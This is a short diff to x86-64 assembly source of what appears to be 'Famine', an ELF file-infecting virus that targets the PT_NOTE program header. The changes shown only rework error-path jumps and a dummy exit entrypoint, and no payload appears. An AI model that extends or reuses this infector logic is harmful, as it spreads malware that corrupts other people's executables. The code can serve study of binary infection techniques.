@@ -1,10 +1,7 @@
 %include "inc/famine.inc"
 
 default rel
-; _dummy_host_entrypoint:
-;     mov rax, SC_EXIT
-;     xor rdi, rdi
-;     syscall
+
 section .text
     ; Trazas
     dir db              "[+] dir",10,0  ;9
@@ -256,10 +253,10 @@ section .text
                 .end_loop_phdr:
 
                     cmp qword VAR(Famine.note_phdr_ptr), 0x0
-                    je .close_file
+                    je .munmap
 
                     cmp qword VAR(Famine.max_vaddr_end), 0x0
-                    je .close_file
+                    je .munmap
 
                 .ftruncate:
 
@@ -391,7 +388,6 @@ section .text
 
         .exit:
         _dummy_host_entrypoint:
-
             mov rax, SC_EXIT
             xor rdi, rdi
             syscall
